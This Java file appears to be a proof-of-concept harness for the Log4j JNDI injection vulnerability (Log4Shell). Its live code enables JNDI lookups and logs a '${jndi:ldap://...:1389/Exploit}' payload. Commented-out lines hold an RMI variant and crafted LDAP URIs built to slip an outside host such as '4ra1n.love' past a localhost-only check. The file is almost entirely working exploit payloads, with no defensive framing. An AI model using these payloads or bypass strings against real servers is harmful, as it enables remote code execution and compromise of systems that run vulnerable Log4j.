
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.builder.impl.DefaultConfigurationBuilder;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.lookup.ResourceBundleLookup;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;
import org.apache.logging.log4j.message.Message;
import org.apache.logging.log4j.message.ParameterizedMessage;

import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
//import org.junit.Test;

public class log4j {


    public static void main(String[] args) throws UnknownHostException, URISyntaxException {
        // log4j-2.15.0-rc1
//        final Configuration config = new DefaultConfigurationBuilder().build(true);
//        final MessagePatternConverter converter =
//                MessagePatternConverter.newInstance(config, new String[] {"lookups"});
//        final Message msg = new ParameterizedMessage("${jndi:rmi://localhost:1099/ Exploit}");
//        final LogEvent event = Log4jLogEvent.newBuilder()
//                .setLoggerName("MyLogger")
//                .setLevel(Level.DEBUG)
//                .setMessage(msg).build();
//        final StringBuilder sb = new StringBuilder();
//        converter.format(event, sb);
//        System.out.println(sb);
        // log4j-2.14.0

        System.setProperty("log4j2.enableJndi", "true");
        final Logger logger = LogManager.getLogger(log4j.class);
         logger.error("${jndi:ldap://localhost:1389/Exploit}");
//                final LogEvent event = Log4jLogEvent.newBuilder()
//                .setLoggerName("MyLogger")
//                .setLevel(Level.DEBUG)
//                .setMessage(new ParameterizedMessage("${bundle:app:flag}")).build();
//        ResourceBundleLookup resourceBundleLookup = new ResourceBundleLookup();
//        resourceBundleLookup.lookup(event,"app:flag");
//        URI uri1 = new URI("ldap://127.0.0.1#@4ra1n.love:1389/badClassName");
//        System.out.println(uri1.getHost());
//
//        URI uri2 = new URI("ldap://127.0.0.1#4ra1n.love:1389/badClassName");
//        System.out.println(uri2.getHost());
//
//        URI uri3 = new URI("ldap://127.0.0.1#.4ra1n.love:1389/badClassName");
//        System.out.println(uri3.getHost());
    }

}
